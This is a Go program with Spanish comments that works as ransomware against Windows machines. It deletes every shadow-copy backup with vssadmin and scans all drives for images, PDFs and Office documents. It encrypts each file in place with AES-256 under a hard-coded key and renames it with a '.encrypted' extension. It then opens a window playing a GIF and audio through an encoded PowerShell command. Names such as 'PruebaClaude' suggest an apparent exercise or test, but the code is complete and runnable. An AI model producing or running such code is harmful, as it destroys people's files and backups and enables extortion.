package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// showMediaWindow muestra el GIF y reproduce el audio en una ventana de Windows.
func showMediaWindow() error {
	gifPath, err := filepath.Abs(filepath.Join("media", "Gif.gif"))
	if err != nil {
		return fmt.Errorf("error al localizar el GIF: %v", err)
	}
	audioPath, err := filepath.Abs(filepath.Join("media", "audio.mp3"))
	if err != nil {
		return fmt.Errorf("error al localizar el audio: %v", err)
	}

	if _, err := os.Stat(gifPath); err != nil {
		return fmt.Errorf("no se encontró el GIF: %v", err)
	}
	if _, err := os.Stat(audioPath); err != nil {
		return fmt.Errorf("no se encontró el audio: %v", err)
	}

	quotePowerShell := func(value string) string {
		return "'" + strings.ReplaceAll(value, "'", "''") + "'"
	}

	script := fmt.Sprintf(`
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = 'PruebaClaude'
$form.StartPosition = 'CenterScreen'
$form.Width = 800
$form.Height = 600

$picture = New-Object System.Windows.Forms.PictureBox
$picture.Dock = 'Fill'
$picture.SizeMode = 'Zoom'
$picture.Image = [System.Drawing.Image]::FromFile(%s)
$form.Controls.Add($picture)

$player = New-Object -ComObject WMPlayer.OCX
$player.URL = %s
$player.settings.setMode('loop', $true)
$player.controls.play()

$form.Add_FormClosed({
    $player.controls.stop()
    $player.close()
    $picture.Image.Dispose()
})

[void]$form.ShowDialog()
`, quotePowerShell(gifPath), quotePowerShell(audioPath))

	encodedScript := base64.StdEncoding.EncodeToString([]byte(utf16LE(script)))
	cmd := exec.Command("powershell.exe", "-NoProfile", "-STA", "-EncodedCommand", encodedScript)
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("error al abrir la ventana multimedia: %v: %s", err, strings.TrimSpace(string(output)))
	}

	return nil
}

func utf16LE(value string) []byte {
	runes := []rune(value)
	encoded := make([]byte, len(runes)*2)
	for i, r := range runes {
		encoded[i*2] = byte(r)
		encoded[i*2+1] = byte(r >> 8)
	}
	return encoded
}

//PARTE OBLIGATORIA
// deleteShadowCopies elimina todas las copias shadow del sistema
func deleteShadowCopies() error {
	fmt.Println("=== Iniciando eliminación de copias shadow ===")
	
	// Listar copias antes de eliminar
	cmd := exec.Command("cmd", "/C", "vssadmin list shadows")
	output, err := cmd.Output()
	if err != nil {
		var exitErr *exec.ExitError
		if errors.As(err, &exitErr) && exitErr.ExitCode() == 1 {
			fmt.Println("No se encontraron copias shadow existentes.")
			return nil
		}else{
			return fmt.Errorf("error al listar copias shadow: %v", err)
		}
		
	}
	fmt.Println("Copias shadow encontradas:")
	fmt.Println(string(output))
	
	// Eliminar todas las copias shadow
	cmd = exec.Command("cmd", "/C", "vssadmin delete shadows /all /quiet")
	err = cmd.Run()
	if err != nil {
		return fmt.Errorf("error al eliminar copias shadow: %v", err)
	}
	
	fmt.Println("✓ Copias shadow eliminadas exitosamente\n")
	return nil
}

// searchFiles busca archivos específicos en todo el sistema
func searchFiles() ([]string, error) {
	fmt.Println("=== Iniciando búsqueda de archivos ===")
	
	// Extensiones a buscar
	extensions := []string{".jpg",".jpeg", ".gif", ".docx", ".xlsx", ".pptx", ".pdf", ".png"}
	
	// Array para almacenar las rutas absolutas encontradas
	var foundFiles []string
	
	// Obtener todas las unidades del sistema (C:, D:, etc.)
	drives := getDrives()
	
	if len(drives) == 0 {
		return nil, fmt.Errorf("no se encontraron unidades de disco")
	}
	
	fmt.Printf("Buscando en unidades: %v\n\n", drives)
	
	// Recorrer cada unidad
	for _, drive := range drives {
		fmt.Printf("Escaneando unidad: %s\\\n", drive)
		
		err := filepath.Walk(drive+"\\", func(path string, info os.FileInfo, err error) error {
			// Ignorar errores de permisos en directorios específicos
			if err != nil {
				return nil // Continuar con el siguiente archivo
			}
			
			// Saltar directorios del sistema para acelerar la búsqueda
			if info.IsDir() && isSystemDirectory(path) {
				return filepath.SkipDir
			}
			
			// Verificar si el archivo tiene una extensión que buscamos
			if !info.IsDir() {
				ext := strings.ToLower(filepath.Ext(path))
				for _, targetExt := range extensions {
					if ext == targetExt {
						absPath, err := filepath.Abs(path)
						if err == nil {
							foundFiles = append(foundFiles, absPath)
							fmt.Printf("  Encontrado: %s\n", absPath)
						}
						break
					}
				}
			}
			
			return nil
		})
		
		if err != nil {
			fmt.Printf("Error durante el escaneo de %s: %v\n", drive, err)
		}
	}
	
	fmt.Printf("\n✓ Búsqueda completada. Total de archivos encontrados: %d\n\n", len(foundFiles))
	return foundFiles, nil
}

// encryptFiles cifra todos los archivos encontrados usando AES
func encryptFiles(files []string) error {
	fmt.Println("=== Iniciando cifrado de archivos ===\n")
	
	// Clave de cifrado: "ByClaude" (se expandirá a 32 bytes para AES-256)
	keyString := "ByClaude"
	key := expandKey(keyString, 32) // AES-256 requiere 32 bytes
	
	fmt.Printf("Clave de cifrado: %s\n", keyString)
	fmt.Printf("Tamaño de clave: %d bytes (AES-256)\n\n", len(key))
	
	if len(files) == 0 {
		fmt.Println("No hay archivos para cifrar.")
		return nil
	}
	
	successCount := 0
	failCount := 0
	
	for i, filePath := range files {
		fmt.Printf("[%d/%d] Cifrando: %s\n", i+1, len(files), filePath)
		
		err := encryptFile(filePath, key)
		if err != nil {
			fmt.Printf("  ✗ Error al cifrar: %v\n", err)
			failCount++
		} else {
			fmt.Printf("  ✓ Archivo cifrado exitosamente\n")
			successCount++
		}
	}
	
	fmt.Printf("\n=== CIFRADO COMPLETADO ===\n")
	fmt.Printf("Archivos cifrados exitosamente: %d\n", successCount)
	fmt.Printf("Archivos con error: %d\n\n", failCount)
	
	if failCount > 0 {
		return fmt.Errorf("se encontraron errores durante el cifrado")
	}
	
	return nil
}

// encryptFile cifra un archivo individual
func encryptFile(filePath string, key []byte) error {
	// Leer el archivo original
	plaintext, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("error al leer archivo: %v", err)
	}
	
	// Crear cipher AES
	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Errorf("error al crear cipher: %v", err)
	}
	
	// Usar GCM (Galois/Counter Mode) para cifrado autenticado
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("error al crear GCM: %v", err)
	}
	
	// Generar nonce aleatorio
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return fmt.Errorf("error al generar nonce: %v", err)
	}
	
	// Cifrar los datos
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	
	// Escribir el archivo cifrado (sobrescribir el original)
	err = os.WriteFile(filePath, ciphertext, 0644)
	if err != nil {
		return fmt.Errorf("error al escribir archivo cifrado: %v", err)
	}

	if err := os.Rename(filePath, filePath+".encrypted"); err != nil {
		return fmt.Errorf("archivo cifrado, pero no se pudo cambiar extension. %v", err)
	}
	
	return nil
}

// expandKey expande una clave de texto a un tamaño específico usando padding
func expandKey(keyString string, targetSize int) []byte {
	key := make([]byte, targetSize)
	keyBytes := []byte(keyString)
	
	// Copiar la clave original
	for i := 0; i < len(keyBytes) && i < targetSize; i++ {
		key[i] = keyBytes[i]
	}
	
	// Rellenar con el resto de la clave repetida si es necesario
	if len(keyBytes) < targetSize {
		for i := len(keyBytes); i < targetSize; i++ {
			key[i] = keyBytes[i%len(keyBytes)]
		}
	}
	
	return key
}

// getDrives obtiene todas las unidades lógicas del sistema
func getDrives() []string {
	var drives []string
	
	// Verificar unidades de la A a la Z
	for i := 0; i < 26; i++ {
		drive := string(rune('A'+i)) + ":"
		_, err := os.Stat(drive + "\\")
		if err == nil {
			drives = append(drives, drive)
		}
	}
	
	return drives
}

// isSystemDirectory retorna true si el directorio es del sistema y debe omitirse
func isSystemDirectory(path string) bool {
	// Directorios que suelen ralentizar el escaneo
	systemDirs := []string{
		"System Volume Information",
		"$Recycle.Bin",
		"pagefile.sys",
		"hiberfil.sys",
		"Boot",
		"Windows",
		"System32",
		"ProgramData",
		"Program Files",
		"Program Files (x86)",
		"AppData",
		"Temp",
		".git",
		"node_modules",
	}
	
	pathLower := strings.ToLower(path)
	for _, sysDir := range systemDirs {
		if strings.Contains(pathLower, strings.ToLower(sysDir)) {
			return true
		}
	}
	
	return false
}

// printResults imprime los resultados de la búsqueda
func printResults(files []string) {
	fmt.Println("=== RESULTADOS DE LA BÚSQUEDA ===")
	fmt.Printf("Total de archivos encontrados: %d\n\n", len(files))
	
	if len(files) == 0 {
		fmt.Println("No se encontraron archivos con las extensiones buscadas.")
		return
	}
	
	for i, file := range files {
		fmt.Printf("%d. %s\n", i+1, file)
	}
}

func main() {
	// Paso 1: Eliminar copias shadow
	if err := deleteShadowCopies(); err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}
	
	// Paso 2: Buscar archivos específicos
	files, err := searchFiles()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}
	
	// Paso 3: Mostrar resultados
	printResults(files)
	
	// Paso 4: Cifrar archivos encontrados
	if err := encryptFiles(files); err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}

	// Paso 5: Mostrar el GIF y reproducir el audio
	if err := showMediaWindow(); err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}
}
